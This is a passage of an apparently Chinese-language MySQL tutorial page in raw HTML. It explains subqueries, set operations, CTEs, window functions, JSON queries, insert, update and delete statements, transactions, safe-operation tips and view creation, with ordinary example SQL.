keyword">WHERE</span> salary <span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">AVG</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span> <span class="token keyword">FROM</span> employees<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 多行子查询（使用IN操作符）</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> category_id <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> id <span class="token keyword">FROM</span> categories <span class="token keyword">WHERE</span> is_active <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 比较子查询（使用ALL/ANY）</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> employees <span class="token keyword">WHERE</span> salary <span class="token operator">></span> <span class="token keyword">ALL</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> salary <span class="token keyword">FROM</span> employees <span class="token keyword">WHERE</span> dept_id <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>FROM子句中的子查询</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 将子查询结果作为临时表</span><span class="token keyword">SELECT</span> dept_stats<span class="token punctuation">.</span>dept_name<span class="token punctuation">,</span> dept_stats<span class="token punctuation">.</span>avg_salary<span class="token keyword">FROM</span> <span class="token punctuation">(</span>    <span class="token keyword">SELECT</span> d<span class="token punctuation">.</span>name <span class="token keyword">AS</span> dept_name<span class="token punctuation">,</span> <span class="token function">AVG</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>salary<span class="token punctuation">)</span> <span class="token keyword">AS</span> avg_salary    <span class="token keyword">FROM</span> departments d    <span class="token keyword">JOIN</span> employees e <span class="token keyword">ON</span> d<span class="token punctuation">.</span>id <span class="token operator">=</span> e<span class="token punctuation">.</span>dept_id    <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> d<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token keyword">AS</span> dept_stats<span class="token keyword">WHERE</span> dept_stats<span class="token punctuation">.</span>avg_salary <span class="token operator">></span> <span class="token number">5000</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>SELECT子句中的子查询</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 在SELECT中使用子查询（相关子查询）</span><span class="token keyword">SELECT</span> p<span class="token punctuation">.</span>product_name<span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> order_items <span class="token keyword">WHERE</span> product_id <span class="token operator">=</span> p<span class="token punctuation">.</span>id<span class="token punctuation">)</span> <span class="token keyword">AS</span> order_count<span class="token keyword">FROM</span> products p<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>EXISTS子查询</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 使用EXISTS检查是否存在相关记录</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> customers c<span class="token keyword">WHERE</span> <span class="token keyword">EXISTS</span> <span class="token punctuation">(</span>    <span class="token keyword">SELECT</span> <span class="token number">1</span> <span class="token keyword">FROM</span> orders o     <span class="token keyword">WHERE</span> o<span class="token punctuation">.</span>customer_id <span class="token operator">=</span> c<span class="token punctuation">.</span>id <span class="token operator">AND</span> o<span class="token punctuation">.</span>total_amount <span class="token operator">></span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-5-集合查询">3.5. 集合查询</h4><p><strong>UNION (去重合并)</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 合并两个查询结果并去重SELECT product_name FROM current_products UNION SELECT product_name FROM discontinued_products;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>UNION ALL (不去重合并)</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 合并两个查询结果保留所有重复项SELECT employee_name FROM full_time_employees UNION ALL SELECT employee_name FROM part_time_employees;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>INTERSECT (交集 - MySQL 8.0+)</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 获取两个查询结果的交集SELECT customer_id FROM premium_customers INTERSECTSELECT customer_id FROM active_customers;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>EXCEPT/MINUS (差集 - MySQL 8.0+)</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 获取第一个查询有而第二个查询没有的结果</span><span class="token keyword">SELECT</span> product_id <span class="token keyword">FROM</span> all_products<span class="token keyword">EXCEPT</span><span class="token keyword">SELECT</span> product_id <span class="token keyword">FROM</span> discontinued_products<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-6-高级查询技巧">3.6. 高级查询技巧</h4><p><strong>公用表表达式 (CTE)</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 基本CTE（提高复杂查询的可读性）</span><span class="token keyword">WITH</span> dept_salary <span class="token keyword">AS</span> <span class="token punctuation">(</span>    <span class="token keyword">SELECT</span> dept_id<span class="token punctuation">,</span> <span class="token function">AVG</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span> <span class="token keyword">AS</span> avg_salary    <span class="token keyword">FROM</span> employees    <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> dept_id<span class="token punctuation">)</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> dept_salary <span class="token keyword">WHERE</span> avg_salary <span class="token operator">></span> <span class="token number">5000</span><span class="token punctuation">;</span><span class="token comment">-- 递归CTE (处理层级数据，如组织结构)</span><span class="token keyword">WITH</span> RECURSIVE org_tree <span class="token keyword">AS</span> <span class="token punctuation">(</span>    <span class="token comment">-- 基础查询（顶级节点）</span>    <span class="token keyword">SELECT</span> id<span class="token punctuation">,</span> name<span class="token punctuation">,</span> parent_id<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token keyword">AS</span> <span class="token keyword">level</span>    <span class="token keyword">FROM</span> employees    <span class="token keyword">WHERE</span> parent_id <span class="token operator">IS</span> <span class="token boolean">NULL</span>        <span class="token keyword">UNION</span> <span class="token keyword">ALL</span>        <span class="token comment">-- 递归查询（下级节点）</span>    <span class="token keyword">SELECT</span> e<span class="token punctuation">.</span>id<span class="token punctuation">,</span> e<span class="token punctuation">.</span>name<span class="token punctuation">,</span> e<span class="token punctuation">.</span>parent_id<span class="token punctuation">,</span> ot<span class="token punctuation">.</span><span class="token keyword">level</span> <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">FROM</span> employees e    <span class="token keyword">JOIN</span> org_tree ot <span class="token keyword">ON</span> e<span class="token punctuation">.</span>parent_id <span class="token operator">=</span> ot<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> org_tree <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token keyword">level</span><span class="token punctuation">,</span> name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>窗口函数 (MySQL 8.0+)</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- ROW_NUMBER() 为每行分配唯一序号</span><span class="token keyword">SELECT</span> employee_name<span class="token punctuation">,</span> salary<span class="token punctuation">,</span>       ROW_NUMBER<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">OVER</span> <span class="token punctuation">(</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> salary <span class="token keyword">DESC</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> salary_rank<span class="token keyword">FROM</span> employees<span class="token punctuation">;</span><span class="token comment">-- RANK() 和 DENSE_RANK() 处理并列排名</span><span class="token keyword">SELECT</span> product_name<span class="token punctuation">,</span> sales<span class="token punctuation">,</span>       RANK<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">OVER</span> <span class="token punctuation">(</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> sales <span class="token keyword">DESC</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> rank<span class="token punctuation">,</span>          <span class="token comment">-- 标准排名（会跳号）</span>       DENSE_RANK<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">OVER</span> <span class="token punctuation">(</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> sales <span class="token keyword">DESC</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> dense_rank  <span class="token comment">-- 密集排名（不跳号）</span><span class="token keyword">FROM</span> products<span class="token punctuation">;</span><span class="token comment">-- 聚合窗口函数（计算移动平均值等）</span><span class="token keyword">SELECT</span> <span class="token keyword">date</span><span class="token punctuation">,</span> revenue<span class="token punctuation">,</span>       <span class="token function">SUM</span><span class="token punctuation">(</span>revenue<span class="token punctuation">)</span> <span class="token keyword">OVER</span> <span class="token punctuation">(</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token keyword">date</span> <span class="token keyword">ROWS</span> <span class="token operator">BETWEEN</span> <span class="token number">2</span> <span class="token keyword">PRECEDING</span> <span class="token operator">AND</span> <span class="token keyword">CURRENT</span> <span class="token keyword">ROW</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token number">3</span>_day_total<span class="token punctuation">,</span>       <span class="token function">AVG</span><span class="token punctuation">(</span>revenue<span class="token punctuation">)</span> <span class="token keyword">OVER</span> <span class="token punctuation">(</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> <span class="token keyword">date</span> <span class="token keyword">ROWS</span> <span class="token operator">BETWEEN</span> <span class="token number">2</span> <span class="token keyword">PRECEDING</span> <span class="token operator">AND</span> <span class="token keyword">CURRENT</span> <span class="token keyword">ROW</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token number">3</span>_day_avg<span class="token keyword">FROM</span> daily_sales<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>JSON查询 (MySQL 5.7+)</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 从JSON字段提取数据</span><span class="token keyword">SELECT</span> id<span class="token punctuation">,</span>        JSON_EXTRACT<span class="token punctuation">(</span>product_details<span class="token punctuation">,</span> <span class="token string">'$.specs.weight'</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> product_weight<span class="token keyword">FROM</span> products<span class="token punctuation">;</span><span class="token comment">-- 使用->操作符简写JSON路径</span><span class="token keyword">SELECT</span> id<span class="token punctuation">,</span> product_details<span class="token operator">-</span><span class="token operator">></span><span class="token string">'$.price'</span> <span class="token keyword">AS</span> product_price<span class="token keyword">FROM</span> products<span class="token punctuation">;</span><span class="token comment">-- JSON条件查询</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> product_details<span class="token operator">-</span><span class="token operator">></span><span class="token string">'$.rating'</span> <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token comment">-- JSON数组处理</span><span class="token keyword">SELECT</span> id<span class="token punctuation">,</span>        JSON_EXTRACT<span class="token punctuation">(</span>tags<span class="token punctuation">,</span> <span class="token string">'$[0]'</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> first_tag<span class="token punctuation">,</span>       JSON_LENGTH<span class="token punctuation">(</span>tags<span class="token punctuation">)</span> <span class="token keyword">AS</span> tag_count<span class="token keyword">FROM</span> articles<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-插入数据-insert">4. 插入数据（INSERT）</h3><p><strong>基本插入</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 插入单行数据（指定列）INSERT INTO table_name (column1, column2, column3) VALUES (value1, value2, value3);#1. 列名和值必须一一对应#2. 可以省略自增主键列#3. 对于有默认值的列可以省略-- 插入单行数据（省略列名，必须提供所有列的值）INSERT INTO table_name VALUES (value1, value2, value3, ...);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>批量插入</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 批量插入多行数据（高效方式）INSERT INTO table_name (column1, column2)VALUES     (value1, value2),    (value3, value4),    (value5, value6);-- 优点：#  1. 减少客户端与服务器通信次数#  2. 提高插入效率-- 使用SET语法插入（较少用）INSERT INTO table_name SET column1 &#x3D; value1,     column2 &#x3D; value2;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>特殊插入方式</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 从其他表复制数据插入INSERT INTO target_table (column1, column2)SELECT source_col1, source_col2 FROM source_tableWHERE condition;-- 插入时忽略重复键错误INSERT IGNORE INTO table_name (column1, column2)VALUES (value1, value2);-- 1. 对于主键或唯一键冲突的记录会被静默忽略-- 2. 不会报错中断执行-- 替换已有记录（先删除后插入）REPLACE INTO table_name (id, column1, column2) VALUES (1, &#39;new_value1&#39;, &#39;new_value2&#39;);&#x2F;* 等同于：DELETE FROM table_name WHERE id &#x3D; 1;INSERT INTO table_name (id, column1, column2) VALUES (1, &#39;new_value1&#39;, &#39;new_value2&#39;);*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-更新数据-update">5. 更新数据（UPDATE）</h3><p><strong>基本更新</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 更新符合条件的记录UPDATE table_nameSET column1 &#x3D; new_value1,    column2 &#x3D; new_value2WHERE condition;-- 1. 一定要有WHERE条件，否则会更新所有行-- 2. 可以同时更新多列-- 使用表达式更新UPDATE productsSET price &#x3D; price * 1.1  -- 价格上调10%WHERE category &#x3D; &#39;电子产品&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>特殊更新方式</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 使用子查询更新</span><span class="token keyword">UPDATE</span> employees<span class="token keyword">SET</span> salary <span class="token operator">=</span> salary <span class="token operator">*</span> <span class="token number">1.05</span><span class="token keyword">WHERE</span> department <span class="token operator">IN</span> <span class="token punctuation">(</span>    <span class="token keyword">SELECT</span> department <span class="token keyword">FROM</span> high_performance_depts<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 多表关联更新</span><span class="token keyword">UPDATE</span> orders o<span class="token keyword">JOIN</span> customers c <span class="token keyword">ON</span> o<span class="token punctuation">.</span>customer_id <span class="token operator">=</span> c<span class="token punctuation">.</span>id<span class="token keyword">SET</span> o<span class="token punctuation">.</span><span class="token keyword">status</span> <span class="token operator">=</span> <span class="token string">'VIP'</span><span class="token keyword">WHERE</span> c<span class="token punctuation">.</span><span class="token keyword">level</span> <span class="token operator">=</span> <span class="token string">'黄金会员'</span><span class="token punctuation">;</span><span class="token comment">-- 使用ORDER BY和LIMIT限制更新</span><span class="token keyword">UPDATE</span> log_entries<span class="token keyword">SET</span> processed <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">WHERE</span> processed <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> created_at<span class="token keyword">LIMIT</span> <span class="token number">1000</span><span class="token punctuation">;</span>  <span class="token comment">-- 每次只处理1000条</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>增量更新</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 基于当前值的增量更新</span><span class="token keyword">UPDATE</span> inventory<span class="token keyword">SET</span> stock <span class="token operator">=</span> stock <span class="token operator">-</span> <span class="token number">5</span>  <span class="token comment">-- 库存减少5</span><span class="token keyword">WHERE</span> product_id <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token comment">-- 时间戳自动更新</span><span class="token keyword">UPDATE</span> articles<span class="token keyword">SET</span> view_count <span class="token operator">=</span> view_count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>    last_viewed <span class="token operator">=</span> <span class="token keyword">CURRENT_TIMESTAMP</span><span class="token keyword">WHERE</span> id <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-删除数据-delete">6. 删除数据（DELETE）</h3><p><strong>基本删除</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">-- 删除符合条件的记录DELETE FROM table_name WHERE condition;-- 1. 没有WHERE条件会删除表中所有数据！-- 2. 删除操作不可逆，建议先备份-- 示例：删除30天前的日志DELETE FROM system_logsWHERE created_at &lt; DATE_SUB(NOW(), INTERVAL 30 DAY);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>特殊删除方式</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 多表关联删除</span><span class="token keyword">DELETE</span> p  <span class="token comment">-- 只删除products表中的记录</span><span class="token keyword">FROM</span> products p<span class="token keyword">JOIN</span> discontinued_items d <span class="token keyword">ON</span> p<span class="token punctuation">.</span>id <span class="token operator">=</span> d<span class="token punctuation">.</span>product_id<span class="token keyword">WHERE</span> d<span class="token punctuation">.</span>discontinued_date <span class="token operator">&lt;</span> <span class="token string">'2023-01-01'</span><span class="token punctuation">;</span><span class="token comment">-- 使用ORDER BY和LIMIT限制删除</span><span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> temp_data<span class="token keyword">WHERE</span> expired <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> created_at<span class="token keyword">LIMIT</span> <span class="token number">1000</span><span class="token punctuation">;</span>  <span class="token comment">-- 每次只删除1000条</span><span class="token comment">-- 快速清空表（不可回滚）</span><span class="token keyword">TRUNCATE</span> <span class="token keyword">TABLE</span> table_name<span class="token punctuation">;</span><span class="token comment">/* 与DELETE的区别：1. 速度更快2. 重置自增计数器3. 无法通过事务回滚4. 不触发DELETE触发器*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7-综合操作技巧">7. 综合操作技巧</h3><p><strong>事务处理</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 使用事务确保数据一致性</span><span class="token keyword">START</span> <span class="token keyword">TRANSACTION</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> orders <span class="token punctuation">(</span>customer_id<span class="token punctuation">,</span> amount<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">99.99</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">UPDATE</span> accounts <span class="token keyword">SET</span> balance <span class="token operator">=</span> balance <span class="token operator">-</span> <span class="token number">99.99</span><span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">COMMIT</span><span class="token punctuation">;</span>  <span class="token comment">-- 或 ROLLBACK 回滚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>条件插入/更新</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 存在则更新，不存在则插入（MySQL特有语法）</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> users <span class="token punctuation">(</span>id<span class="token punctuation">,</span> name<span class="token punctuation">,</span> login_count<span class="token punctuation">)</span><span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'张三'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">ON</span> <span class="token keyword">DUPLICATE</span> <span class="token keyword">KEY</span> <span class="token keyword">UPDATE</span>     login_count <span class="token operator">=</span> login_count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>    last_login <span class="token operator">=</span> <span class="token function">NOW</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>使用临时表批量操作</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建临时表存储要处理的数据</span><span class="token keyword">CREATE</span> <span class="token keyword">TEMPORARY</span> <span class="token keyword">TABLE</span> temp_updates <span class="token punctuation">(</span>    id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>    new_value <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 批量插入要更新的数据</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> temp_updates <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 使用临时表批量更新</span><span class="token keyword">UPDATE</span> main_table m<span class="token keyword">JOIN</span> temp_updates t <span class="token keyword">ON</span> m<span class="token punctuation">.</span>id <span class="token operator">=</span> t<span class="token punctuation">.</span>id<span class="token keyword">SET</span> m<span class="token punctuation">.</span><span class="token keyword">column</span> <span class="token operator">=</span> t<span class="token punctuation">.</span>new_value<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-安全操作建议">8. 安全操作建议</h3><ol><li><p><strong>重要数据操作前先备份</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建备份表</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> orders_backup <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> orders<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>使用SELECT测试WHERE条件</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 执行DELETE前先用SELECT确认影响范围</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> orders <span class="token keyword">WHERE</span> <span class="token keyword">status</span> <span class="token operator">=</span> <span class="token string">'cancelled'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>启用安全更新模式</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 防止无WHERE条件的更新/删除</span><span class="token keyword">SET</span> SQL_SAFE_UPDATES <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>分批处理大数据量</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 使用LIMIT分批删除</span><span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> large_table <span class="token keyword">WHERE</span> condition <span class="token keyword">LIMIT</span> <span class="token number">10000</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>考虑使用软删除</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 添加is_deleted标记而非物理删除</span><span class="token keyword">UPDATE</span> customers <span class="token keyword">SET</span> is_deleted <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">WHERE</span> id <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="9-mysql-视图操作命令">9. MySQL 视图操作命令</h3><h4 id="9-1-创建视图">9.1. 创建视图</h4><p><strong>基本视图创建</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">CREATE VIEW view_name AS SELECT column1, column2, ... FROM table_nameWHERE condition;-- 1. 视图是基于SQL查询的虚拟表-- 2. 不实际存储数据，每次访问时动态生成-- 3. 可以简化复杂查询<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>创建带检查选项的视图</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">CREATE VIEW view_name AS SELECT column1, column2 FROM table_nameWHERE conditionWITH [CASCADED|LOCAL] CHECK OPTION;-- CHECK OPTION作用：-- 1. 通过视图修改数据时，必须符合视图定义的条件-- 2. CASCADED：严格检查所有底层视图条件-- 3. LOCAL：只检查当前视图条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>创建算法确定的视图</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">ALGORITHM</span> <span class="token operator">=</span> <span class="token keyword">MERGE</span> <span class="token keyword">VIEW</span> view_name <span class="token keyword">AS</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> table_name <span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span class="token comment">/*算法选项：1. MERGE：将视图查询与外部查询合并执行（性能最佳）2. TEMPTABLE：先执行视图查询创建临时表3. UNDEFINED：由MySQL自动选择（默认）*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>创建带有安全限制的视图</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">SQL</span> SECURITY <span class="token keyword">DEFINER</span> <span class="token keyword">VIEW</span> view_name <span class="token keyword">AS</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span class="token comment">/*安全选项：1. DEFINER：以视图创建者权限执行（默认）2. INVOKER：以调用者权限执行*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="9-2-修改视图">9.2. 修改视图</h4><p><strong>完全替换视图定义</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">VIEW</span> view_name <span class="token keyword">AS</span><span class="token keyword">SELECT</span> new_columns<span class="token keyword">FROM</span> new_tables<span class="token keyword">WHERE</span> new_conditions<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>使用ALTER修改视图</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">VIEW</span> view_name <span class="token keyword">AS</span><span class="token keyword">SELECT</span> updated_columns<span class="token keyword">FROM</span> updated_tables<span class="token keyword">WHERE</span> 